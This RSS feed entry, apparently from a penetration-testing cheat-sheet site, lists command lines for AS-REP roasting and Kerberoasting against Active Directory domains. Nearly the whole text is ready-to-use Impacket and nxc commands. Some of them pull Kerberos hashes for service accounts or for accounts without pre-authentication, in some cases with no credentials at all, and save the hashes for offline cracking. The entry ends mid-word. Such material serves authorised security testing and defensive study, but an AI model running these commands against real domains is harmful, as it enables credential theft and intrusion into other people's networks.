channel.title: As_rep Roasting on TLDRBins
channel.description: Recent content in As_rep Roasting on TLDRBins

item.title: Kerberoasting
item.description: AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC> # Single user without creds impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER> # Multiple valid usernames (nxc) nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> Note: Times skew have to be within 5 minutes in kerberos # Kerberoasting without cred sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.
